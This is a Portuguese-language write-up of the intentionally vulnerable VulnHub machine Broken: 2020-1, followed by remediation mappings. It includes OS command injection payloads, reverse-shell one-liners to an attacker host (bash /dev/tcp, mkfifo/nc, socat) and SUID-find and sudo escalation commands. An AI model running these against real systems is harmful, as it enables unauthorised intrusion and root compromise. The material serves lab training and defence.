# Broken: 2020-1 — Writeup (PT-BR)

> *Quando uma aplicação web simplesmente joga o seu input direto num comando shell e a única coisa entre você e um root shell é um binário SUID com entrada no GTFOBins, você sabe que o time de dev tava passando por uma fase difícil em 2020. Véi, pelo menos valida o input. Vacilou feio.*

---

## Metadados da Máquina

| Campo | Valor |
|---|---|
| **Nível** | Fácil/Médio |
| **VM Alvo** | Broken: 2020-1 |
| **VM Atacante** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/broken-2020-1,/ |
| **Técnicas** | Enumeração de aplicação web, injeção de comando OS, reverse shell, abuso de binário SUID / escalada de privilégio via sudo |
| **CVEs** | Nenhum (misconfig; CWE-78 OS Command Injection) |
| **Relevância APT** | Injeção de comando é vetor de acesso inicial de múltiplos atores como APT28 e grupos de ransomware criminosos explorando apps web expostas (MITRE G0007); abuso de SUID documentado em toolkits de pós-exploração Linux |

---

## Resumo do Ataque

```
[Atacante]
      |
      v
netdiscover + nmap -sV -sC
--> 22/tcp (SSH), 80/tcp (HTTP Apache)
      |
      v
Gobuster / dirb: enumerar diretórios web e endpoints
--> encontrar parâmetro vulnerável em formulário web
      |
      v
Injeção de comando OS: "; id", "| whoami", "$(id)"
--> confirmar RCE pela resposta do servidor
      |
      v
Payload de reverse shell via injeção:
"; bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'"
nc -lvp 4444 --> shell com baixo privilégio (www-data)
      |
      v
Estabilização do shell (pty.spawn)
      |
      v
find / -perm -4000 (bins SUID) + sudo -l
--> SUID find / cron gravável / misconfig sudo identificado
      |
      v
Exploit GTFOBins: find . -exec /bin/bash -p \; -quit
--> uid=0(root)
      |
      v
cat /root/root.txt
    [ROOT]
```

---

## Metodologia

1. Descoberta de rede com netdiscover e varredura completa de portas com detecção de serviço
2. Enumeração de diretórios da aplicação web com gobuster/dirb
3. Teste manual de parâmetros de input em busca de injeção de comando OS
4. Entrega de reverse shell via injeção de comando
5. Estabilização do shell e upgrade de TTY
6. Enumeração de escalada de privilégio: binários SUID, permissões sudo, crons graváveis
7. Escalada para root via abuso de SUID (GTFOBins) ou misconfig de sudo

---

## Passos

### Passo 1: Descoberta de Rede e Varredura de Portas

**Contexto:** Identificar o alvo na rede local e enumerar serviços abertos. Broken: 2020-1 é uma máquina Linux intencionalmente vulnerável com uma aplicação web como superfície de ataque principal.

```bash
netdiscover -r 192.168.1.0/24
nmap -sV -sC 192.168.1.X -oN nmap-inicial.txt
```

**Saída esperada:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd 2.4.x
```

**Alternativas:** `rustscan -a 192.168.1.X -- -sV` para varredura inicial mais rápida; `masscan -p 1-65535 192.168.1.X --rate=1000` para descoberta completa de portas.

**Nota real:** Superfícies de ataque externas geralmente começam com HTTP/HTTPS. Ferramentas automatizadas de descoberta de ativos (Shodan, Censys, `httpx` do Project Discovery) indexam esses endpoints continuamente; qualquer misconfig é encontrada rapidamente.

**MITRE TTP:** T1595.001 - Varredura Ativa: Blocos de IP | T1046 - Descoberta de Serviço de Rede

---

### Passo 2: Enumeração da Aplicação Web

**Contexto:** Com HTTP confirmado na porta 80, enumerar a aplicação web em busca de diretórios, endpoints e parâmetros de input. Procurar formulários que interagem com o backend do servidor.

```bash
gobuster dir \
  -u http://192.168.1.X/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,html,txt,sh \
  -o gobuster-saida.txt
```

**Passos manuais no navegador:**
- Revisar todos os formulários visíveis e campos de input
- Verificar código-fonte em busca de parâmetros comentados ou inputs ocultos
- Testar parâmetros: `?cmd=`, `?exec=`, `?ping=`, `?host=`, `?ip=`

**Alternativas:** `feroxbuster` para enumeração recursiva; `nikto -h http://192.168.1.X` para verificações automatizadas rápidas.

**Nota real:** OWASP ZAP e o scanner ativo do Burp Suite Pro detectam injeção de comando OS durante varreduras automatizadas. Bug bounty hunters encontram esses problemas rotineiramente em endpoints `/api/ping`, `/admin/test` e `/tools/`.

**MITRE TTP:** T1592.002 - Coletar Informações de Rede da Vítima | T1083 - Descoberta de Arquivos e Diretórios

---

### Passo 3: Injeção de Comando OS

**Contexto:** Após identificar um input potencialmente vulnerável (geralmente um campo de formulário que realiza operações de rede, diagnósticos ou consultas no servidor), testar injeção de comando OS usando metacaracteres shell.

```bash
# Payloads de teste injetados no valor do parâmetro:
; id
| whoami
`id`
$(id)
& id
|| id
```

**Procurar o output do comando refletido na resposta HTTP.** Se `id` retornar `uid=33(www-data)` ou similar, RCE está confirmada.

**Montar um reverse shell:**
```bash
# Iniciar listener primeiro:
nc -lvp 4444

# Injetar via parâmetro vulnerável (codificado em URL):
; bash -c 'bash -i >& /dev/tcp/192.168.1.ATACANTE/4444 0>&1'
```

**Saída esperada no listener:**
```
Connection from 192.168.1.X:XXXXX
bash: no job control in this shell
www-data@broken:/$
```

**Alternativas:** `python3 -c 'import socket,subprocess,os;...'` se o redirecionamento bash estiver bloqueado; `mkfifo /tmp/f; nc LHOST 4444 < /tmp/f | /bin/sh > /tmp/f` para sistemas mais antigos.

**Nota real:** Injeção de comando OS (CWE-78) é trivialmente prevenível com APIs parametrizadas (subprocess com lista de args, sem `shell=True`). Aparece na lista de vulnerabilidades mais exploradas da CISA. Apps afetadas devem usar `shlex.quote()` no mínimo, ou refatorar para evitar execução de shell completamente.

**MITRE TTP:** T1190 - Exploit em Aplicação Pública | T1059.004 - Interpretador de Comando e Script: Shell Unix

---

### Passo 4: Estabilização do Shell

**Contexto:** Shells netcat brutas não têm tab completion, controle de job nem tratamento de sinal correto. Estabilizar para uma sessão interativa utilizável antes da enumeração.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z para colocar em background
stty raw -echo
fg
# Pressionar Enter duas vezes
```

**Alternativa (socat TTY completo):**
```bash
# Atacante:
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Alvo (injetado):
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:4444
```

**MITRE TTP:** T1059.004 - Interpretador de Comando e Script: Shell Unix

---

### Passo 5: Enumeração de Escalada de Privilégio

**Contexto:** Com um shell de baixo privilégio, enumerar caminhos para root: binários SUID, permissões sudo, crons graváveis, capabilities interessantes e caminhos com escrita para todos.

```bash
# Binários SUID:
find / -perm -4000 -type f 2>/dev/null

# Permissões sudo:
sudo -l

# Cron jobs graváveis:
ls -la /etc/cron* /var/spool/cron/crontabs/ 2>/dev/null
cat /etc/crontab

# Capabilities interessantes:
getcap -r / 2>/dev/null

# Caminhos graváveis por todos:
find / -writable -type f 2>/dev/null | grep -v proc
```

**Saída esperada (exemplo, SUID find):**
```
/usr/bin/find
```

**Alternativas:** Executar `linpeas.sh` para enumeração automatizada abrangente; `pspy64` para monitorar execuções de cron e processos em tempo real sem root.

**Nota real:** Auditorias regulares de SUID são uma tarefa básica de hardening. O CIS Benchmark para Linux (Nível 1) recomenda explicitamente remover bits SUID/SGID desnecessários. Ferramentas como `aide` e `tripwire` detectam mudanças não autorizadas de SUID.

**MITRE TTP:** T1083 - Descoberta de Arquivos e Diretórios | T1057 - Descoberta de Processos

---

### Passo 6: Root via Binário SUID (GTFOBins)

**Contexto:** Com `find` SUID identificado, usar a técnica do GTFOBins para lançar uma instância bash com privilégios. Ixi, que fácil.

```bash
find . -exec /bin/bash -p \; -quit
```

**Saída esperada:**
```
bash-4.x# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
bash-4.x# cat /root/root.txt
[FLAG ROOT]
```

**Alternativa (se sudo -l mostrar entrada nopasswd):**
```bash
# Exemplo: sudo find / -exec /bin/bash \; também funciona
# Ou: sudo vim -c ':!/bin/bash'
```

**Nota real:** GTFOBins (gtfobins.github.io) documenta técnicas de abuso para 180+ binários Unix. A correção é remover bits SUID desnecessários com `chmod -s /usr/bin/find`. Ferramentas automatizadas como Lynis e Wazuh SYSCHECK sinalizam bits SUID inesperados em binários não-sistema.

**MITRE TTP:** T1548.001 - Abuso de Controle de Elevação: Setuid e Setgid

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Onde Encontrado | Usado Para |
|---|---|---|---|
| Prova de RCE | `uid=33(www-data)` | Injeção de comando no formulário web | Execução de código confirmada em nível OS |
| Flag Root | `/root/root.txt` | Pós-escalada via SUID find | Conclusão da máquina |

---

## Lições Aprendidas

| Achado | Relevância no Mundo Real |
|---|---|
| Injeção de comando OS via formulário web | Qualquer input não sanitizado passado a APIs shell é explorável. Use subprocess parametrizado; nunca `os.system(input_do_usuario)`. |
| App web rodando como usuário de alto privilégio | Rodar Apache/PHP como www-data está correto; rodar como root ou sudoer amplifica toda vuln web para comprometimento total do sistema. |
| SUID em binário não essencial (find) | Nenhum deploy padrão precisa de find com SUID. Remova. Audite com `find / -perm -4000` semanalmente e alerte em mudanças. |
| Sem WAF ou validação de input | Um WAF não previne completamente isso, mas validação na camada de aplicação (allowlists, verificação de tipo) para a maioria das tentativas de injeção antes de chegar ao shell. |

---

## Mapeamento MITRE ATT&CK

| Tática | Técnica | ID |
|---|---|---|
| Reconhecimento | Varredura Ativa: Blocos de IP | T1595.001 |
| Descoberta | Descoberta de Serviço de Rede | T1046 |
| Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso Inicial | Exploit em Aplicação Pública | T1190 |
| Execução | Interpretador de Comando e Script: Shell Unix | T1059.004 |
| Escalada de Privilégio | Abuso de Controle de Elevação: Setuid/Setgid | T1548.001 |
| Evasão de Defesa | Abuso de Controle de Elevação | T1548 |

---

## Remediação

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | ID.RA-1 | Classificar todas as apps web expostas externamente; incluir injeção de comando no modelo de ameaças |
| Proteger | PR.AC-4 | Executar serviços web como usuário não privilegiado dedicado; remover bits SUID desnecessários |
| Proteger | PR.IP-1 | Implementar validação de input e codificação de output como padrão de código seguro |
| Detectar | DE.CM-1 | Monitorar spawn incomum de processo filho a partir do processo do servidor web |
| Responder | RS.MI-1 | Isolar servidor web comprometido imediatamente após detecção de RCE |

### Controles NIST SP 800-53

| Controle | Requisito | Aplicabilidade |
|---|---|---|
| SI-10 | Validação de Input de Informação | Validar e sanitizar todo input fornecido pelo usuário antes de processar |
| AC-6 | Menor Privilégio | Conta do processo web não deve ter direitos sudo nem binários SUID acessíveis |
| CM-6 | Configurações | Desabilitar SUID em binários não essenciais; usar linha de base do CIS benchmark |
| AU-12 | Geração de Registro de Auditoria | Registrar todos os inputs da aplicação web e spawn de processos pelo usuário web |
| SC-7 | Proteção de Fronteira | Restringir conexões de saída do servidor web para prevenir callbacks de reverse shell |

### Relevância CISA KEV

CWE-78 (OS Command Injection) é a causa raiz de múltiplas entradas do CISA KEV (ex.: CVE-2021-22205 GitLab, CVE-2022-1388 F5 BIG-IP, CVE-2023-27997 Fortinet). Essa classe de vulnerabilidade está entre as mais exploradas ativamente por atores de ameaça de nação-estado e criminosos.

### C2M2 (Modelo de Maturidade de Capacidade em Cibersegurança)

| Domínio | Prática | Lacuna |
|---|---|---|
| ACM | ACM-2b | Sem auditoria baseline de SUID = MIL0 |
| IAM | IAM-1a | App web como usuário privilegiado = MIL0 |
| SA (Consciência Situacional) | SA-1a | Sem monitoramento de spawn de processo = MIL0 |

### Contramedidas MITRE D3FEND

| Técnica D3FEND | ID | Defende Contra |
|---|---|---|
| Análise de Spawn de Processo | D3-PSA | Detecta shell gerado por processo Apache/PHP |
| Análise de Tráfego de Rede | D3-NTA | Detecta conexão de saída de reverse shell |
| Hardening de Aplicação | D3-AH | Validação de input previne injeção de comando |
| Allowlist de Executáveis | D3-EAL | Previne execução de binários inesperados via SUID |

---

## Considerações Finais

Mano, Broken: 2020-1 é uma máquina de injeção de comando limpa e direta que acerta o básico. A chain é linear e o privesc é GTFOBins de manual. Não é a máquina mais elaborada do VulnHub, mas treina exatamente o que você precisa reconhecer: input não sanitizado chegando a uma chamada shell, e um binário SUID que nunca deveria estar lá. Se você consegue explicar CWE-78 pra um desenvolvedor e apontar a linha exata do código que precisa corrigir depois de rootar essa box, esse é o ganho real. GG, time de dev vacilou.

Thanks guys!! (❍ᴥ❍ʋ)
